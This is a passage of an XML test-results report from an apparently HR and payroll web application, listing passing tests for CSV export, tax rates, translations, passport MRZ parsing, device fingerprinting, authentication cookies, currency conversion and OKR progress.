    <testcase classname="formatDateTime handles Armenian locale" name="formatDateTime handles Armenian locale" time="0.002">
    </testcase>
    <testcase classname="formatDateTime includes time component" name="formatDateTime includes time component" time="0.001">
    </testcase>
    <testcase classname="exportToCSV returns CSV string with headers" name="exportToCSV returns CSV string with headers" time="0.002">
    </testcase>
    <testcase classname="exportToCSV includes all record data in CSV" name="exportToCSV includes all record data in CSV" time="0.002">
    </testcase>
    <testcase classname="exportToCSV quotes cell values" name="exportToCSV quotes cell values" time="0.004">
    </testcase>
    <testcase classname="exportToCSV handles unknown user gracefully" name="exportToCSV handles unknown user gracefully" time="0.007">
    </testcase>
    <testcase classname="exportToCSV handles empty records" name="exportToCSV handles empty records" time="0.001">
    </testcase>
    <testcase classname="downloadCSV creates an anchor element and appends it to body" name="downloadCSV creates an anchor element and appends it to body" time="0.015">
    </testcase>
    <testcase classname="downloadCSV handles empty CSV content" name="downloadCSV handles empty CSV content" time="0.002">
    </testcase>
    <testcase classname="calculateEffectiveTaxRate - parameterized gross=100000 tax=0 -&gt; 0%" name="calculateEffectiveTaxRate - parameterized gross=100000 tax=0 -&gt; 0%" time="0.001">
    </testcase>
    <testcase classname="calculateEffectiveTaxRate - parameterized gross=100000 tax=10000 -&gt; 10%" name="calculateEffectiveTaxRate - parameterized gross=100000 tax=10000 -&gt; 10%" time="0">
    </testcase>
    <testcase classname="calculateEffectiveTaxRate - parameterized gross=100000 tax=25000 -&gt; 25%" name="calculateEffectiveTaxRate - parameterized gross=100000 tax=25000 -&gt; 25%" time="0.001">
    </testcase>
    <testcase classname="calculateEffectiveTaxRate - parameterized gross=50000 tax=50000 -&gt; 100%" name="calculateEffectiveTaxRate - parameterized gross=50000 tax=50000 -&gt; 100%" time="0">
    </testcase>
    <testcase classname="calculateEffectiveTaxRate - parameterized gross=0 tax=5000 -&gt; 0%" name="calculateEffectiveTaxRate - parameterized gross=0 tax=5000 -&gt; 0%" time="0.001">
    </testcase>
    <testcase classname="calculateEffectiveTaxRate - parameterized gross=100000 tax=12345 -&gt; 12.35%" name="calculateEffectiveTaxRate - parameterized gross=100000 tax=12345 -&gt; 12.35%" time="0">
    </testcase>
    <testcase classname="calculateEffectiveTaxRate - parameterized gross=100000 tax=12346 -&gt; 12.35%" name="calculateEffectiveTaxRate - parameterized gross=100000 tax=12346 -&gt; 12.35%" time="0.001">
    </testcase>
    <testcase classname="calculateEffectiveTaxRate - parameterized gross=1 tax=1 -&gt; 100%" name="calculateEffectiveTaxRate - parameterized gross=1 tax=1 -&gt; 100%" time="0">
    </testcase>
    <testcase classname="getPayrollSummary - parameterized handles single employee" name="getPayrollSummary - parameterized handles single employee" time="0.001">
    </testcase>
    <testcase classname="getPayrollSummary - parameterized handles many employees" name="getPayrollSummary - parameterized handles many employees" time="0.001">
    </testcase>
    <testcase classname="filterPayrollRuns - parameterized filter {&quot;status&quot;:&quot;completed&quot;} returns 2 results" name="filterPayrollRuns - parameterized filter {&quot;status&quot;:&quot;completed&quot;} returns 2 results" time="0">
    </testcase>
    <testcase classname="filterPayrollRuns - parameterized filter {&quot;status&quot;:&quot;pending&quot;} returns 1 results" name="filterPayrollRuns - parameterized filter {&quot;status&quot;:&quot;pending&quot;} returns 1 results" time="0.001">
    </testcase>
    <testcase classname="filterPayrollRuns - parameterized filter {&quot;status&quot;:&quot;draft&quot;} returns 0 results" name="filterPayrollRuns - parameterized filter {&quot;status&quot;:&quot;draft&quot;} returns 0 results" time="0.001">
    </testcase>
    <testcase classname="filterPayrollRuns - parameterized filter {&quot;period&quot;:&quot;2024-02&quot;} returns 1 results" name="filterPayrollRuns - parameterized filter {&quot;period&quot;:&quot;2024-02&quot;} returns 1 results" time="0.001">
    </testcase>
    <testcase classname="filterPayrollRuns - parameterized filter {&quot;search&quot;:&quot;alpha&quot;} returns 1 results" name="filterPayrollRuns - parameterized filter {&quot;search&quot;:&quot;alpha&quot;} returns 1 results" time="0">
    </testcase>
    <testcase classname="filterPayrollRuns - parameterized filter {&quot;search&quot;:&quot;payroll&quot;} returns 3 results" name="filterPayrollRuns - parameterized filter {&quot;search&quot;:&quot;payroll&quot;} returns 3 results" time="0.001">
    </testcase>
    <testcase classname="getStatusColor - parameterized status paid returns color containing emerald" name="getStatusColor - parameterized status paid returns color containing emerald" time="0.001">
    </testcase>
    <testcase classname="getStatusColor - parameterized status calculated returns color containing blue" name="getStatusColor - parameterized status calculated returns color containing blue" time="0.001">
    </testcase>
    <testcase classname="getStatusColor - parameterized status cancelled returns color containing red" name="getStatusColor - parameterized status cancelled returns color containing red" time="0">
    </testcase>
    <testcase classname="getStatusColor - parameterized status draft returns color containing gray" name="getStatusColor - parameterized status draft returns color containing gray" time="0">
    </testcase>
    <testcase classname="getStatusColor - parameterized status approved returns color containing green" name="getStatusColor - parameterized status approved returns color containing green" time="0.001">
    </testcase>
    <testcase classname="getStatusColor - parameterized status unknown returns color containing gray" name="getStatusColor - parameterized status unknown returns color containing gray" time="0">
    </testcase>
    <testcase classname="getStatusColor - parameterized status pending returns color containing gray" name="getStatusColor - parameterized status pending returns color containing gray" time="0.001">
    </testcase>
    <testcase classname="getStatusColor - parameterized status  returns color containing gray" name="getStatusColor - parameterized status  returns color containing gray" time="0">
    </testcase>
    <testcase classname="formatCurrency - parameterized formats amount 0 without throwing" name="formatCurrency - parameterized formats amount 0 without throwing" time="0.001">
    </testcase>
    <testcase classname="formatCurrency - parameterized formats amount 100 without throwing" name="formatCurrency - parameterized formats amount 100 without throwing" time="0.001">
    </testcase>
    <testcase classname="formatCurrency - parameterized formats amount 1000 without throwing" name="formatCurrency - parameterized formats amount 1000 without throwing" time="0">
    </testcase>
    <testcase classname="formatCurrency - parameterized formats amount 100000 without throwing" name="formatCurrency - parameterized formats amount 100000 without throwing" time="0.001">
    </testcase>
    <testcase classname="formatCurrency - parameterized formats amount 999999 without throwing" name="formatCurrency - parameterized formats amount 999999 without throwing" time="0.001">
    </testcase>
  </testsuite>
  <testsuite name="getServerTranslation" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:03" time="0.739" tests="15">
    <testcase classname="getServerTranslation returns translation function and locale" name="getServerTranslation returns translation function and locale" time="0.004">
    </testcase>
    <testcase classname="getServerTranslation falls back to &quot;en&quot; for unsupported locales" name="getServerTranslation falls back to &quot;en&quot; for unsupported locales" time="0.001">
    </testcase>
    <testcase classname="getServerTranslation returns the key itself for missing translations" name="getServerTranslation returns the key itself for missing translations" time="0.002">
    </testcase>
    <testcase classname="getServerTranslation retrieves nested translation values" name="getServerTranslation retrieves nested translation values" time="0.002">
    </testcase>
    <testcase classname="getServerTranslation returns key for partially missing nested path" name="getServerTranslation returns key for partially missing nested path" time="0.001">
    </testcase>
    <testcase classname="getServerTranslation replaces params in translated strings" name="getServerTranslation replaces params in translated strings" time="0.001">
    </testcase>
    <testcase classname="getServerTranslation handles multiple param replacements" name="getServerTranslation handles multiple param replacements" time="0.001">
    </testcase>
    <testcase classname="getServerTranslation returns key when param replacement does not change key" name="getServerTranslation returns key when param replacement does not change key" time="0.001">
    </testcase>
    <testcase classname="getServerTranslation loads different namespaces independently" name="getServerTranslation loads different namespaces independently" time="0.001">
    </testcase>
    <testcase classname="getServerTranslation returns object values as the key" name="getServerTranslation returns object values as the key" time="0.001">
    </testcase>
    <testcase classname="getServerTranslation handles empty or missing translation file gracefully" name="getServerTranslation handles empty or missing translation file gracefully" time="0">
    </testcase>
    <testcase classname="getServerTranslation returns key for non-string translation values" name="getServerTranslation returns key for non-string translation values" time="0.001">
    </testcase>
    <testcase classname="getServerTranslation supports russian locale" name="getServerTranslation supports russian locale" time="0.003">
    </testcase>
    <testcase classname="getServerTranslation supports armenian locale" name="getServerTranslation supports armenian locale" time="0.001">
    </testcase>
    <testcase classname="getServerTranslation supports german locale" name="getServerTranslation supports german locale" time="0.001">
    </testcase>
  </testsuite>
  <testsuite name="parseMrzLines" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:03" time="0.786" tests="8">
    <testcase classname="parseMrzLines parses TD3 MRZ lines correctly" name="parseMrzLines parses TD3 MRZ lines correctly" time="0.005">
    </testcase>
    <testcase classname="parseMrzLines collects errors from invalid fields" name="parseMrzLines collects errors from invalid fields" time="0.001">
    </testcase>
    <testcase classname="parseMrzLines trims and uppercases input lines" name="parseMrzLines trims and uppercases input lines" time="0.001">
    </testcase>
    <testcase classname="parseMrzLines filters out empty lines" name="parseMrzLines filters out empty lines" time="0.001">
    </testcase>
    <testcase classname="parseMrzLines handles missing optional fields" name="parseMrzLines handles missing optional fields" time="0.001">
    </testcase>
    <testcase classname="scanPassportImage returns parsed result when OCR finds MRZ lines" name="scanPassportImage returns parsed result when OCR finds MRZ lines" time="0.003">
    </testcase>
    <testcase classname="scanPassportImage returns null when no MRZ-like lines are found" name="scanPassportImage returns null when no MRZ-like lines are found" time="0.001">
    </testcase>
    <testcase classname="scanPassportImage returns null when fewer than 2 MRZ lines found" name="scanPassportImage returns null when fewer than 2 MRZ lines found" time="0.001">
    </testcase>
  </testsuite>
  <testsuite name="getDeviceFingerprint" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:03" time="0.735" tests="9">
    <testcase classname="getDeviceFingerprint returns fingerprint, userAgent, and data object" name="getDeviceFingerprint returns fingerprint, userAgent, and data object" time="0.017">
    </testcase>
    <testcase classname="getDeviceFingerprint includes correct userAgent" name="getDeviceFingerprint includes correct userAgent" time="0.001">
    </testcase>
    <testcase classname="getDeviceFingerprint includes screen resolution in data" name="getDeviceFingerprint includes screen resolution in data" time="0.001">
    </testcase>
    <testcase classname="getDeviceFingerprint includes navigator properties in data" name="getDeviceFingerprint includes navigator properties in data" time="0.002">
    </testcase>
    <testcase classname="getDeviceFingerprint includes timezone in data" name="getDeviceFingerprint includes timezone in data" time="0.003">
    </testcase>
    <testcase classname="getDeviceFingerprint generates a fingerprint that is a string" name="getDeviceFingerprint generates a fingerprint that is a string" time="0.002">
    </testcase>
    <testcase classname="getDeviceFingerprint generates consistent fingerprint for same data (deterministic hash)" name="getDeviceFingerprint generates consistent fingerprint for same data (deterministic hash)" time="0.002">
    </testcase>
    <testcase classname="getDeviceFingerprint generates different fingerprint for different userAgent" name="getDeviceFingerprint generates different fingerprint for different userAgent" time="0.002">
    </testcase>
    <testcase classname="getDeviceFingerprint is a 32-char hex string (hash truncated)" name="getDeviceFingerprint is a 32-char hex string (hash truncated)" time="0.006">
    </testcase>
  </testsuite>
  <testsuite name="getServerConvexAuth" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:04" time="0.577" tests="4">
    <testcase classname="getServerConvexAuth returns payload + token when hr-auth-token is valid" name="getServerConvexAuth returns payload + token when hr-auth-token is valid" time="0.004">
    </testcase>
    <testcase classname="getServerConvexAuth falls back to oauth-session cookie when hr-auth-token is absent" name="getServerConvexAuth falls back to oauth-session cookie when hr-auth-token is absent" time="0.002">
    </testcase>
    <testcase classname="getServerConvexAuth returns null when no cookie exists" name="getServerConvexAuth returns null when no cookie exists" time="0.001">
    </testcase>
    <testcase classname="getServerConvexAuth returns null when JWT verification fails" name="getServerConvexAuth returns null when JWT verification fails" time="0.001">
    </testcase>
  </testsuite>
  <testsuite name="LOCALE_CURRENCY" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:04" time="0.729" tests="36">
    <testcase classname="LOCALE_CURRENCY maps en to USD" name="LOCALE_CURRENCY maps en to USD" time="0.001">
    </testcase>
    <testcase classname="LOCALE_CURRENCY maps ru to RUB" name="LOCALE_CURRENCY maps ru to RUB" time="0">
    </testcase>
    <testcase classname="LOCALE_CURRENCY maps hy to AMD" name="LOCALE_CURRENCY maps hy to AMD" time="0.001">
    </testcase>
    <testcase classname="LOCALE_CURRENCY maps de to EUR" name="LOCALE_CURRENCY maps de to EUR" time="0">
    </testcase>
    <testcase classname="LOCALE_CURRENCY has all supported locales" name="LOCALE_CURRENCY has all supported locales" time="0.001">
    </testcase>
    <testcase classname="BASE_PRICES has starter price" name="BASE_PRICES has starter price" time="0">
    </testcase>
    <testcase classname="BASE_PRICES has professional price" name="BASE_PRICES has professional price" time="0.001">
    </testcase>
    <testcase classname="BASE_PRICES has enterprise price" name="BASE_PRICES has enterprise price" time="0">
    </testcase>
    <testcase classname="BASE_PRICES all prices are non-negative" name="BASE_PRICES all prices are non-negative" time="0.001">
    </testcase>
    <testcase classname="getCurrencyConfig returns USD config for en locale" name="getCurrencyConfig returns USD config for en locale" time="0">
    </testcase>
    <testcase classname="getCurrencyConfig returns RUB config for ru locale" name="getCurrencyConfig returns RUB config for ru locale" time="0.001">
    </testcase>
    <testcase classname="getCurrencyConfig returns AMD config for hy locale" name="getCurrencyConfig returns AMD config for hy locale" time="0.001">
    </testcase>
    <testcase classname="getCurrencyConfig returns EUR config for de locale" name="getCurrencyConfig returns EUR config for de locale" time="0">
    </testcase>
    <testcase classname="getCurrencyConfig falls back to USD for unknown locale" name="getCurrencyConfig falls back to USD for unknown locale" time="0">
    </testcase>
    <testcase classname="getCurrencyConfig falls back to USD for undefined locale" name="getCurrencyConfig falls back to USD for undefined locale" time="0.001">
    </testcase>
    <testcase classname="getCurrencyConfig returns uppercase currency code" name="getCurrencyConfig returns uppercase currency code" time="0">
    </testcase>
    <testcase classname="LOCALE_CURRENCY - all mappings locale en maps to USD" name="LOCALE_CURRENCY - all mappings locale en maps to USD" time="0.001">
    </testcase>
    <testcase classname="LOCALE_CURRENCY - all mappings locale ru maps to RUB" name="LOCALE_CURRENCY - all mappings locale ru maps to RUB" time="0">
    </testcase>
    <testcase classname="LOCALE_CURRENCY - all mappings locale hy maps to AMD" name="LOCALE_CURRENCY - all mappings locale hy maps to AMD" time="0.001">
    </testcase>
    <testcase classname="LOCALE_CURRENCY - all mappings locale de maps to EUR" name="LOCALE_CURRENCY - all mappings locale de maps to EUR" time="0">
    </testcase>
    <testcase classname="BASE_PRICES - validation all prices are numbers" name="BASE_PRICES - validation all prices are numbers" time="0.001">
    </testcase>
    <testcase classname="BASE_PRICES - validation has exactly 3 tiers" name="BASE_PRICES - validation has exactly 3 tiers" time="0">
    </testcase>
    <testcase classname="BASE_PRICES - validation has correct tiers" name="BASE_PRICES - validation has correct tiers" time="0.001">
    </testcase>
    <testcase classname="getCurrencyConfig - all locales locale en -&gt; symbol=$ code=USD" name="getCurrencyConfig - all locales locale en -&gt; symbol=$ code=USD" time="0.001">
    </testcase>
    <testcase classname="getCurrencyConfig - all locales locale ru -&gt; symbol=RUB code=RUB" name="getCurrencyConfig - all locales locale ru -&gt; symbol=RUB code=RUB" time="0.001">
    </testcase>
    <testcase classname="getCurrencyConfig - all locales locale hy -&gt; symbol=AMD code=AMD" name="getCurrencyConfig - all locales locale hy -&gt; symbol=AMD code=AMD" time="0">
    </testcase>
    <testcase classname="getCurrencyConfig - all locales locale de -&gt; symbol=EUR code=EUR" name="getCurrencyConfig - all locales locale de -&gt; symbol=EUR code=EUR" time="0.001">
    </testcase>
    <testcase classname="getCurrencyConfig - all locales locale unknown -&gt; symbol=$ code=USD" name="getCurrencyConfig - all locales locale unknown -&gt; symbol=$ code=USD" time="0.001">
    </testcase>
    <testcase classname="getCurrencyConfig - all locales locale undefined -&gt; symbol=$ code=USD" name="getCurrencyConfig - all locales locale undefined -&gt; symbol=$ code=USD" time="0">
    </testcase>
    <testcase classname="convertPrice converts from USD to USD (identity)" name="convertPrice converts from USD to USD (identity)" time="0.003">
    </testcase>
    <testcase classname="convertPrice converts using the cached rates first" name="convertPrice converts using the cached rates first" time="0.002">
    </testcase>
    <testcase classname="convertPrice falls back to default USD for unknown locale" name="convertPrice falls back to default USD for unknown locale" time="0.001">
    </testcase>
    <testcase classname="convertPrice handles fetch failure gracefully with fallback rates" name="convertPrice handles fetch failure gracefully with fallback rates" time="0.001">
    </testcase>
    <testcase classname="convertPrice returns formatted price with currency symbol" name="convertPrice returns formatted price with currency symbol" time="0.004">
    </testcase>
    <testcase classname="getExchangeRates returns fallback rates when fetch fails" name="getExchangeRates returns fallback rates when fetch fails" time="0.002">
    </testcase>
    <testcase classname="getExchangeRates caches rates after fetching" name="getExchangeRates caches rates after fetching" time="0.002">
    </testcase>
  </testsuite>
  <testsuite name="computeKRProgress" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:04" time="0.875" tests="102">
    <testcase classname="computeKRProgress increase direction returns 0 when current equals start" name="computeKRProgress increase direction returns 0 when current equals start" time="0.002">
    </testcase>
    <testcase classname="computeKRProgress increase direction returns 100 when current equals target" name="computeKRProgress increase direction returns 100 when current equals target" time="0.001">
    </testcase>
    <testcase classname="computeKRProgress increase direction returns ~50 when current is halfway" name="computeKRProgress increase direction returns ~50 when current is halfway" time="0">
    </testcase>
    <testcase classname="computeKRProgress increase direction returns 25 when quarter done" name="computeKRProgress increase direction returns 25 when quarter done" time="0.001">
    </testcase>
    <testcase classname="computeKRProgress increase direction returns 75 when three-quarters done" name="computeKRProgress increase direction returns 75 when three-quarters done" time="0">
    </testcase>
    <testcase classname="computeKRProgress increase direction clamps to 100 when exceeding target" name="computeKRProgress increase direction clamps to 100 when exceeding target" time="0.001">
    </testcase>
    <testcase classname="computeKRProgress increase direction handles non-zero start values" name="computeKRProgress increase direction handles non-zero start values" time="0.001">
    </testcase>
    <testcase classname="computeKRProgress increase direction handles small ranges" name="computeKRProgress increase direction handles small ranges" time="0">
    </testcase>
    <testcase classname="computeKRProgress increase direction handles large numbers" name="computeKRProgress increase direction handles large numbers" time="0.001">
    </testcase>
    <testcase classname="computeKRProgress increase direction rounds to nearest integer" name="computeKRProgress increase direction rounds to nearest integer" time="0.001">
    </testcase>
    <testcase classname="computeKRProgress decrease direction returns 0 when current equals start" name="computeKRProgress decrease direction returns 0 when current equals start" time="0">
    </testcase>
    <testcase classname="computeKRProgress decrease direction returns 100 when current equals target" name="computeKRProgress decrease direction returns 100 when current equals target" time="0.001">
    </testcase>
    <testcase classname="computeKRProgress decrease direction returns ~50 when halfway reduced" name="computeKRProgress decrease direction returns ~50 when halfway reduced" time="0">
    </testcase>
    <testcase classname="computeKRProgress decrease direction handles non-zero targets" name="computeKRProgress decrease direction handles non-zero targets" time="0.001">
    </testcase>
    <testcase classname="computeKRProgress decrease direction clamps to 100 when below target" name="computeKRProgress decrease direction clamps to 100 when below target" time="0.001">
    </testcase>
    <testcase classname="computeKRProgress boolean metric type returns 100 when currentValue &gt;= 1" name="computeKRProgress boolean metric type returns 100 when currentValue &gt;= 1" time="0.001">
    </testcase>
    <testcase classname="computeKRProgress boolean metric type returns 0 when currentValue &lt; 1" name="computeKRProgress boolean metric type returns 0 when currentValue &lt; 1" time="0.001">
    </testcase>
    <testcase classname="computeKRProgress boolean metric type returns 100 when currentValue &gt;= 1 for boolean" name="computeKRProgress boolean metric type returns 100 when currentValue &gt;= 1 for boolean" time="0">
    </testcase>
    <testcase classname="computeKRProgress edge cases returns 100 when range is zero and current equals target" name="computeKRProgress edge cases returns 100 when range is zero and current equals target" time="0.001">
    </testcase>
    <testcase classname="computeKRProgress edge cases returns 0 when range is zero and current differs from target" name="computeKRProgress edge cases returns 0 when range is zero and current differs from target" time="0">
    </testcase>
    <testcase classname="computeKRProgress edge cases clamps negative progress to 0" name="computeKRProgress edge cases clamps negative progress to 0" time="0">
    </testcase>
    <testcase classname="computeKRProgress edge cases handles percentage metric type" name="computeKRProgress edge cases handles percentage metric type" time="0.001">
    </testcase>
    <testcase classname="computeKRProgress edge cases handles currency metric type" name="computeKRProgress edge cases handles currency metric type" time="0">
    </testcase>
    <testcase classname="computeObjectiveProgress returns 0 for empty KRs array" name="computeObjectiveProgress returns 0 for empty KRs array" time="0.001">
    </testcase>
    <testcase classname="computeObjectiveProgress returns 0 when total weight is zero" name="computeObjectiveProgress returns 0 when total weight is zero" time="0.001">
    </testcase>
    <testcase classname="computeObjectiveProgress single KR returns the KR progress when weight = 100" name="computeObjectiveProgress single KR returns the KR progress when weight = 100" time="0.001">
    </testcase>
    <testcase classname="computeObjectiveProgress single KR returns the KR progress when weight is non-standard" name="computeObjectiveProgress single KR returns the KR progress when weight is non-standard" time="0">
    </testcase>
    <testcase classname="computeObjectiveProgress multiple KRs with equal weights averages progress across equally-weighted KRs" name="computeObjectiveProgress multiple KRs with equal weights averages progress across equally-weighted KRs" time="0.001">
    </testcase>
    <testcase classname="computeObjectiveProgress multiple KRs with equal weights handles three equally-weighted KRs" name="computeObjectiveProgress multiple KRs with equal weights handles three equally-weighted KRs" time="0">
    </testcase>
    <testcase classname="computeObjectiveProgress multiple KRs with different weights computes weighted average correctly" name="computeObjectiveProgress multiple KRs with different weights computes weighted average correctly" time="0">
    </testcase>
    <testcase classname="computeObjectiveProgress multiple KRs with different weights gives same result regardless of weight sum (normalization)" name="computeObjectiveProgress multiple KRs with different weights gives same result regardless of weight sum (normalization)" time="0.001">
    </testcase>
    <testcase classname="computeObjectiveProgress mixed metric types combines boolean and number KRs correctly" name="computeObjectiveProgress mixed metric types combines boolean and number KRs correctly" time="0.002">
    </testcase>
    <testcase classname="computeObjectiveProgress mixed metric types combines decrease and increase directions" name="computeObjectiveProgress mixed metric types combines decrease and increase directions" time="0.001">
    </testcase>
    <testcase classname="computeObjectiveProgress edge cases handles all KRs at 100%" name="computeObjectiveProgress edge cases handles all KRs at 100%" time="0.001">
    </testcase>
    <testcase classname="computeObjectiveProgress edge cases handles all KRs at 0%" name="computeObjectiveProgress edge cases handles all KRs at 0%" time="0">
    </testcase>
    <testcase classname="computeObjectiveProgress edge cases rounds to nearest integer" name="computeObjectiveProgress edge cases rounds to nearest integer" time="0.002">
    </testcase>
    <testcase classname="computeObjectiveProgress edge cases handles large weight differences" name="computeObjectiveProgress edge cases handles large weight differences" time="0.001">
    </testcase>
    <testcase classname="computeObjectiveProgress edge cases handles many KRs (6+)" name="computeObjectiveProgress edge cases handles many KRs (6+)" time="0.001">
    </testcase>
    <testcase classname="computeKRProgress - parameterized increase (start=0 target=100 current=0) -&gt; 0%" name="computeKRProgress - parameterized increase (start=0 target=100 current=0) -&gt; 0%" time="0">
    </testcase>
    <testcase classname="computeKRProgress - parameterized increase (start=0 target=100 current=10) -&gt; 10%" name="computeKRProgress - parameterized increase (start=0 target=100 current=10) -&gt; 10%" time="0.001">
    </testcase>
    <testcase classname="computeKRProgress - parameterized increase (start=0 target=100 current=20) -&gt; 20%" name="computeKRProgress - parameterized increase (start=0 target=100 current=20) -&gt; 20%" time="0">
    </testcase>
    <testcase classname="computeKRProgress - parameterized increase (start=0 target=100 current=25) -&gt; 25%" name="computeKRProgress - parameterized increase (start=0 target=100 current=25) -&gt; 25%" time="0.001">
    </testcase>
    <testcase classname="computeKRProgress - parameterized increase (start=0 target=100 current=33) -&gt; 33%" name="computeKRProgress - parameterized increase (start=0 target=100 current=33) -&gt; 33%" time="0">
    </testcase>
    <testcase classname="computeKRProgress - parameterized increase (start=0 target=100 current=50) -&gt; 50%" name="computeKRProgress - parameterized increase (start=0 target=100 current=50) -&gt; 50%" time="0.001">
    </testcase>
    <testcase classname="computeKRProgress - parameterized increase (start=0 target=100 current=66) -&gt; 66%" name="computeKRProgress - parameterized increase (start=0 target=100 current=66) -&gt; 66%" time="0">
    </testcase>
    <testcase classname="computeKRProgress - parameterized increase (start=0 target=100 current=75) -&gt; 75%" name="computeKRProgress - parameterized increase (start=0 target=100 current=75) -&gt; 75%" time="0.001">
    </testcase>
    <testcase classname="computeKRProgress - parameterized increase (start=0 target=100 current=90) -&gt; 90%" name="computeKRProgress - parameterized increase (start=0 target=100 current=90) -&gt; 90%" time="0">
    </testcase>
    <testcase classname="computeKRProgress - parameterized increase (start=0 target=100 current=100) -&gt; 100%" name="computeKRProgress - parameterized increase (start=0 target=100 current=100) -&gt; 100%" time="0.001">
    </testcase>
    <testcase classname="computeKRProgress - parameterized increase (start=0 target=100 current=110) -&gt; 100%" name="computeKRProgress - parameterized increase (start=0 target=100 current=110) -&gt; 100%" time="0.001">
    </testcase>
    <testcase classname="computeKRProgress - parameterized increase (start=0 target=100 current=200) -&gt; 100%" name="computeKRProgress - parameterized increase (start=0 target=100 current=200) -&gt; 100%" time="0">
    </testcase>
    <testcase classname="computeKRProgress - parameterized increase (start=1000 target=5000 current=1000) -&gt; 0%" name="computeKRProgress - parameterized increase (start=1000 target=5000 current=1000) -&gt; 0%" time="0.001">
    </testcase>
    <testcase classname="computeKRProgress - parameterized increase (start=1000 target=5000 current=2000) -&gt; 25%" name="computeKRProgress - parameterized increase (start=1000 target=5000 current=2000) -&gt; 25%" time="0">
    </testcase>
    <testcase classname="computeKRProgress - parameterized increase (start=1000 target=5000 current=3000) -&gt; 50%" name="computeKRProgress - parameterized increase (start=1000 target=5000 current=3000) -&gt; 50%" time="0">
    </testcase>
    <testcase classname="computeKRProgress - parameterized increase (start=1000 target=5000 current=4000) -&gt; 75%" name="computeKRProgress - parameterized increase (start=1000 target=5000 current=4000) -&gt; 75%" time="0.001">
    </testcase>
    <testcase classname="computeKRProgress - parameterized increase (start=1000 target=5000 current=5000) -&gt; 100%" name="computeKRProgress - parameterized increase (start=1000 target=5000 current=5000) -&gt; 100%" time="0.001">
    </testcase>
    <testcase classname="computeKRProgress - parameterized decrease (start=100 target=0 current=100) -&gt; 0%" name="computeKRProgress - parameterized decrease (start=100 target=0 current=100) -&gt; 0%" time="0">
    </testcase>
    <testcase classname="computeKRProgress - parameterized decrease (start=100 target=0 current=75) -&gt; 25%" name="computeKRProgress - parameterized decrease (start=100 target=0 current=75) -&gt; 25%" time="0.001">
    </testcase>
    <testcase classname="computeKRProgress - parameterized decrease (start=100 target=0 current=50) -&gt; 50%" name="computeKRProgress - parameterized decrease (start=100 target=0 current=50) -&gt; 50%" time="0">
    </testcase>
    <testcase classname="computeKRProgress - parameterized decrease (start=100 target=0 current=25) -&gt; 75%" name="computeKRProgress - parameterized decrease (start=100 target=0 current=25) -&gt; 75%" time="0.001">
    </testcase>
    <testcase classname="computeKRProgress - parameterized decrease (start=100 target=0 current=0) -&gt; 100%" name="computeKRProgress - parameterized decrease (start=100 target=0 current=0) -&gt; 100%" time="0">
    </testcase>
    <testcase classname="computeKRProgress - parameterized decrease (start=100 target=0 current=-50) -&gt; 100%" name="computeKRProgress - parameterized decrease (start=100 target=0 current=-50) -&gt; 100%" time="0.001">
    </testcase>
    <testcase classname="computeKRProgress - parameterized decrease (start=50 target=10 current=50) -&gt; 0%" name="computeKRProgress - parameterized decrease (start=50 target=10 current=50) -&gt; 0%" time="0.001">
    </testcase>
    <testcase classname="computeKRProgress - parameterized decrease (start=50 target=10 current=30) -&gt; 50%" name="computeKRProgress - parameterized decrease (start=50 target=10 current=30) -&gt; 50%" time="0">
    </testcase>
    <testcase classname="computeKRProgress - parameterized decrease (start=50 target=10 current=10) -&gt; 100%" name="computeKRProgress - parameterized decrease (start=50 target=10 current=10) -&gt; 100%" time="0">
    </testcase>
    <testcase classname="computeKRProgress - parameterized decrease (start=1000 target=100 current=1000) -&gt; 0%" name="computeKRProgress - parameterized decrease (start=1000 target=100 current=1000) -&gt; 0%" time="0">
    </testcase>
    <testcase classname="computeKRProgress - parameterized decrease (start=1000 target=100 current=550) -&gt; 50%" name="computeKRProgress - parameterized decrease (start=1000 target=100 current=550) -&gt; 50%" time="0">
    </testcase>
    <testcase classname="computeKRProgress - parameterized decrease (start=1000 target=100 current=100) -&gt; 100%" name="computeKRProgress - parameterized decrease (start=1000 target=100 current=100) -&gt; 100%" time="0">
    </testcase>
    <testcase classname="computeObjectiveProgress - parameterized computes weighted progress for []" name="computeObjectiveProgress - parameterized computes weighted progress for []" time="0.001">
    </testcase>
    <testcase classname="computeObjectiveProgress - parameterized computes weighted progress for [{&quot;s&quot;:0,&quot;t&quot;:100,&quot;c&quot;:50,&quot;d&quot;:&quot;increase&quot;,&quot;m&quot;:&quot;number&quot;,&quot;w&quot;:100}]" name="computeObjectiveProgress - parameterized computes weighted progress for [{&quot;s&quot;:0,&quot;t&quot;:100,&quot;c&quot;:50,&quot;d&quot;:&quot;increase&quot;,&quot;m&quot;:&quot;number&quot;,&quot;w&quot;:100}]" time="0.001">
    </testcase>
    <testcase classname="computeObjectiveProgress - parameterized computes weighted progress for [{&quot;s&quot;:0,&quot;t&quot;:100,&quot;c&quot;:0,&quot;d&quot;:&quot;increase&quot;,&quot;m&quot;:&quot;number&quot;,&quot;w&quot;:100}]" name="computeObjectiveProgress - parameterized computes weighted progress for [{&quot;s&quot;:0,&quot;t&quot;:100,&quot;c&quot;:0,&quot;d&quot;:&quot;increase&quot;,&quot;m&quot;:&quot;number&quot;,&quot;w&quot;:100}]" time="0.001">
    </testcase>
    <testcase classname="computeObjectiveProgress - parameterized computes weighted progress for [{&quot;s&quot;:0,&quot;t&quot;:100,&quot;c&quot;:100,&quot;d&quot;:&quot;increase&quot;,&quot;m&quot;:&quot;number&quot;,&quot;w&quot;:100}]" name="computeObjectiveProgress - parameterized computes weighted progress for [{&quot;s&quot;:0,&quot;t&quot;:100,&quot;c&quot;:100,&quot;d&quot;:&quot;increase&quot;,&quot;m&quot;:&quot;number&quot;,&quot;w&quot;:100}]" time="0">
    </testcase>
